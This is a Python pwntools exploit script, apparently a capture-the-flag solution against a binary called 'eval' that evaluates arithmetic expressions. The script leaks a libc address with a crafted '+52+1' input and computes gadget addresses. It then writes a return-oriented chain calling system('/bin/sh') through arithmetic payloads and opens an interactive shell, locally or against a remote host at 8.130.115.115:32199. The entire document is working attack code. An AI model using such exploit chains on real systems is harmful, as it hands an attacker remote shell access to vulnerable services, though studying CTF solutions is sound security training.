#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc.so.6')
elf = ELF('./eval')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./eval')
else:
    io = remote('8.130.115.115',32199)

def p():
    gdb.attach(proc.pidof(io)[0])

def pstr(addr):
    return str(addr).encode()

payload = b'+52+1'
io.sendline(payload)
libc.address= int(io.recvuntil(b"\n",drop = True),10) - 0x24084
success("libc_base --> " + hex(libc.address))

ret = libc.address + 0x0000000000022679 # ret
pop_rdi = libc.address + 0x0000000000023b6a # pop rdi ; ret
pop_rdi_rbp = libc.address + 0x00000000000248f2 # pop rdi ; pop rbp ; ret
bin_sh = libc.address + 0x1b45bd
warning("set breakpoint at ret --> " + hex(ret))
warning("set breakpoint at pop_rdi --> " + hex(pop_rdi))
warning("set breakpoint at bin_sh --> " + hex(bin_sh))
warning("set breakpoint at system --> " + hex(libc.sym['system']))
#p()
#payload2 = +51+ A-B * 1 + B-C * 1 + C-D * 1 + D
payload2 = b'+51+' + pstr(pop_rdi_rbp + bin_sh) + b"*1-" + pstr(bin_sh - libc.sym['system']-10) + b'*1+' + pstr(10) + b"*1+" + pstr(libc.sym['system'])
io.sendline(payload2)

pause()
io.sendline()

io.interactive()

